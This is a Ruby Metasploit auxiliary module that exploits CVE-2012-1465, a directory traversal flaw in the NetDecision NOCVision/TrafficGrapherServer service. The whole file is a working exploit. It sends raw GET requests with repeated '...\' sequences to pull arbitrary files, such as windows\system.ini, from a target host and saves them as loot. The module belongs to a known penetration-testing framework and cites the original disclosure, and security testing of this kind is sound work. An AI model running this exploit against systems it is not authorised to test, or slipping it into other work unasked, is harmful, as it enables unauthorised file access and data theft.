##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetDecision NOCVision Server Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal bug in NetDecision's
        TrafficGrapherServer.exe service.  This is done by using "...\" in
        the path to retrieve a file on a vulnerable machine.
      },
      'References'     =>
        [
          [ 'CVE', '2012-1465' ],
          [ 'OSVDB', '79863' ],
          [ 'URL', 'http://aluigi.altervista.org/adv/netdecision_1-adv.txt' ],
        ],
      'Author'         =>
        [
          'Luigi Auriemma',  #Initial discovery, poc
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Mar 07 2012"
    ))

    register_options(
      [
        # 8087 = TrafficGrapherServer
        # 8090 = NOCVisionServer
        Opt::RPORT(8087),
        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
      ])
  end

  def run_host(ip)
    trav = "...\\...\\...\\...\\...\\...\\"

    # In case the user doesn't realize he doesn't need to begin with "\",
    # we'll correct that for him
    file = datastore['FILEPATH']
    file = file[1,file.length] if file[0,1] == "\\"

    uri = "/#{trav}#{file}"
    print_status("#{ip}:#{rport} - Retriving #{file}")

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => uri
    }, 25)

    if res
      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
    else
      print_error("#{ip}:#{rport} - No response")
      return
    end

    if res.body.empty?
      print_error("No file to download (empty)")
    else
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'netdecision.http',
        'application/octet-stream',
        ip,
        res.body,
        fname)
      print_status("File saved in: #{path}")
    end
  end
end
